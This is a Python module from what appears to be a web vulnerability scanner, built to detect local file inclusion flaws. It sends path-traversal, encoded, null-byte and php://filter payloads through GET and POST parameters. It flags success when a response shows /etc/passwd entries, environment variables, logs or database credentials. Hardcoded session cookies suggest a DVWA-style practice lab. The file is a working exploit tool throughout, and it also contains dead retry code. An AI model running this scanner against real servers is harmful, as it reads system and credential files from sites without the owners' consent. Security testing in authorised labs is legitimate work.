import os, sys, urllib, re, string, requests
import urllib.request
import base64
from urllib import parse
from urllib.parse import urlparse, parse_qs, parse_qsl
import json
import time
cookies = {'PHPSESSID': 'vrh7ihvkgcrfl1s5tjasg9epg4', 'security': 'low'}
#output
def make_GET_form(url):
    dic={}
    dic['vuln']='LFI'
    dic['method']='GET'
    dic['url']=url
    print("LFI GET FIND")
    return dic
def make_POST_form(url,data):
    dic={}
    dic['vuln']='LFI'
    dic['method']='POST'
    dic['url']=url
    dic['data']=data
    print("LFI POST FIND")
    return dic
#input
def scan_type1(url: str, params: dict):
    with open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f:
        data = f.readlines()
    for items in params.values():
        target = url + items['action']
        method = items['method']
        dic = {}
        for ipt in items['inputs']:
            dic[ipt['name']] = ipt['value']
        if method == 'get':
            return get_scan_lfi(data,dic,target)
        elif method == 'post':
            return post_scan_lfi(data,dic,target)
        else:
            print('Error in' + target + 'method type must be assigned')
            return False
    return False
def scan_type2(url: str):
    with open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f:
        data = f.readlines()
        
    params = url.split("?")[1]
    target = url.split("?")[0]
    key = ''
    dic = {}
    if "&" in params:
        tmp = params.split("&")
        for i in range(len(tmp)):
            key = tmp[i].split("=")[0]
            dic[key]=tmp[i].split("=")[1]
    else:
        key = params.split("=")[0]
        dic[key]= params.split("=")[1]
    return get_scan_lfi(data,dic,target)

def get_scan_lfi(data,dic,target):
    go_deeper = "../"
    encode = "%2E%2E%2F"
    double_encode = "%252E%252E%252F"
    php_filter = "php://filter/convert.base64-encode/resource="
    encode_filter = "php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource%253D"
    key_list = list(dic.keys())
    if len(key_list) == 1:
        key = key_list[0]
        if (scan_func(go_deeper, data, key, target)) == False:
            if(scan_func(encode,data,key,target)) == False:
                if(scan_func(double_encode,data,key,target)) == False:
                    if(scan_func(php_filter,data,key,target)) == False:
                        if(scan_func(encode_filter,data,key,target)) == False:
                            print("Not vulnerable")
                            return False
                
    else:
        for key in dic.keys():
            temp_dic = dic.copy()
            temp_dic[key]="@@@@@@"
            
            scan_func_multi(go_deeper,data,temp_dic,target)
            scan_func_multi(encode,data,temp_dic,target)
            scan_func_multi(double_encode,data,temp_dic,target)
            scan_func_multi(php_filter,data,temp_dic,target)
            scan_func_multi(encode_filter,data,temp_dic,target)
            
def scan_func(deeper, data, key, target):
    global cookies
    nullByte = "%00"
    
    if deeper == "php://filter/convert.base64-encode/resource=" or deeper == "php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource%253D":
        for file_name in data:
            file_name = file_name.replace("\n", "")
            scan_filter = target + "?" + key+ "=" + deeper + file_name
            try:
                res_filter = requests.get(scan_filter, cookies = cookies)
            except:
                print("error on LFI "+scan_filter)
                time.sleep(2)
                return False
                res_filter = requests.get(scan_filter, cookies = cookies)

            if res_filter.status_code == 200:
                text = res_filter.text
                temp = text + '='*(4-len(text)%4)
                decode_res_text = base64.b64decode(temp)
                if "<?php" in str(decode_res_text) or (check_success(str(decode_res_text))==True):
                    return make_GET_form(scan_filter)
    else:
        for j in range(0,10):
            for file_name in data:
                file_name = file_name.replace("\n", "")
                scan_addr = target + "?" + key+ "=" + (deeper*j) + file_name
                try:
                    res = requests.get(scan_addr, cookies=cookies)
                except:
                    print("error on LFI "+scan_addr)
                    time.sleep(2)
                    return False
                    res = requests.get(scan_addr, cookies=cookies)
                if res.status_code == 200:
                    if check_success(res.text) == True:
                        return make_GET_form(scan_addr)
                    else:
                        scan_null = scan_addr + nullByte
                        try:
                            res_null = requests.get(scan_null, cookies=cookies)
                        except:
                            print("error on LFI "+scan_null)
                            time.sleep(2)
                            return False
                            res_null = requests.get(scan_null, cookies=cookies)
                        if res_null.status_code == 200:
                            if check_success(res_null.text) == True:
                                return make_GET_form(scan_null)
    return False
    
#need to combine with 'scan_func'
def scan_func_multi(deeper, data, dic, target):
    global cookies, where
    nullByte = "%00"
    
    if "@@@@@@" in dic.values():
        where = find_key(dic,"@@@@@@")
    if deeper == "php://filter/convert.base64-encode/resource=" or deeper == "php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource%253D":
        for file_name in data:
            file_name = file_name.replace("\n", "")
            dic[where] = deeper+file_name
            scan_filter = make_url(target, dic)
            try:
                res_filter = requests.get(scan_filter, cookies = cookies)
            except:
                print("error on LFI "+scan_filter)
                time.sleep(2)
                return False
                res_filter = requests.get(scan_filter, cookies = cookies)
            if res_filter.status_code == 200:
                text = res_filter.text
                temp = text + '='*(4-len(text)%4)
                decode_res_text = base64.b64decode(temp)
                if "<?php" in str(decode_res_text) or (check_success(str(decode_res_text))==True):
                    return make_GET_form(scan_filter)
    else:
        for j in range(0,10):
            for file_name in data:
                file_name = file_name.replace("\n", "")
                dic[where] = deeper*j+file_name
                scan_addr = make_url(target,dic)
                try:
                    res = requests.get(scan_addr, cookies=cookies)
                except:
                    print("error on LFI "+scan_addr)
                    time.sleep(2)
                    return False
                    res = requests.get(scan_addr, cookies=cookies)
                if res.status_code == 200:
                    if check_success(res.text) == True:
                        return make_GET_form(scan_addr)
                    else:
                        dic[where]=deeper*j+file_name+nullByte
                        scan_null = make_url(target,dic)
                        try:
                            res_null = requests.get(scan_null, cookies=cookies)
                        except:
                            print("error on LFI "+scan_null)
                            time.sleep(2)
                            return False
                            res_null = requests.get(scan_null, cookies=cookies)
                        if res_null.status_code == 200:
                            if check_success(res_null.text) == True:
                                return make_GET_form(scan_null)
    return False
def post_scan_lfi(data,dic,target):
    go_deeper = "../"
    encode = "%2E%2E%2F"
    double_encode = "%252E%252E%252F"
    php_filter = "php://filter/convert.base64-encode/resource="
    encode_filter = "php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource%253D"
    
    for key in dic.keys():
        temp_dic = dic.copy()
        temp_dic[key]="@@@@@@"
        scan_func_post(go_deeper,data,temp_dic,target)
        scan_func_post(encode,data,temp_dic,target)
        scan_func_post(double_encode,data,temp_dic,target)
        scan_func_post(php_filter,data,temp_dic,target)
        scan_func_post(encode_filter,data,temp_dic,target)
def scan_func_post(deeper, data, dic, target):
    global cookies, where
    nullByte = "%00"
    
    if "@@@@@@" in dic.values():
        where = find_key(dic,"@@@@@@")
    if deeper == "php://filter/convert.base64-encode/resource=" or deeper == "php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource%253D":
        for file_name in data:
            file_name = file_name.replace("\n", "")
            dic[where] = deeper+file_name
            try:
                res_filter = requests.post(target, data=dic, cookies = cookies)
            except:
                print("error on LFI "+target)
                time.sleep(2)
                return False
                res_filter = requests.post(target, data=dic, cookies = cookies)
            if res_filter.status_code == 200:
                text = res_filter.text
                temp = text + '='*(4-len(text)%4)
                decode_res_text = base64.b64decode(temp)
                if "<?php" in str(decode_res_text) or (check_success(str(decode_res_text))==True):
                    return make_POST_form(target,dic)
    else:
        for j in range(0,10):
            for file_name in data:
                file_name = file_name.replace("\n", "")
                dic[where] = deeper*j+file_name
                try:
                    res = requests.post(target, data=dic, cookies=cookies)
                except:
                    print("error on LFI "+target)
                    time.sleep(2)
                    return False
                    res = requests.post(target, data=dic, cookies=cookies)
                if res.status_code == 200:
                    if check_success(res.text) == True:
                        return make_POST_form(target,dic)
                    else:
                        dic[where]=deeper*j+file_name+nullByte
                        try:
                            res_null = requests.post(target, data=dic, cookies=cookies)
                        except:
                            print("error on LFI "+target)
                            time.sleep(2)
                            return False
                            res_null = requests.post(target, data=dic, cookies=cookies)
                        if res_null.status_code == 200:
                            if check_success(res_null.text) == True:
                                return make_POST_form(target,dic)
    return False
def check_success(res_text):
    if("root:" in  res_text or ("sbin" in res_text and "nologin" in res_text)  or "DB_NAME" in res_text or "daemon:" in res_text or "DOCUMENT_ROOT=" in res_text or "PATH=" in res_text or "HTTP_USER_AGENT" in res_text or "HTTP_ACCEPT_ENCODING=" in res_text or "users:x" in res_text or ("GET /" in res_text and ("HTTP/1.1" in res_text or "HTTP/1.0" in res_text)) or "apache_port=" in res_text or "cpanel/logs/access" in res_text or "allow_login_autocomplete" in res_text or "database_prefix=" in res_text or "emailusersbandwidth" in res_text or "adminuser=" in res_text):
        return True
    else:
        False
def find_key(dict, val):
  return next(key for key, value in dict.items() if value == val)
def make_url(url, params):
    scan_addr = url + "?"
    cnt = 0
    for key, value in params.items():
        query = key +"="+value
        cnt += 1
        if cnt == len(params):
            scan_addr = scan_addr + query
        else:
            scan_addr = scan_addr + query + "&"
    return scan_addr

def lfi_attack(arg1: str, arg2):
    if arg1.startswith('http'):
        return scan_type1(arg1,arg2)
    elif arg1 == 'get':
        return scan_type2(arg2)
    else:
        print('Error in lfi_attack')
        return False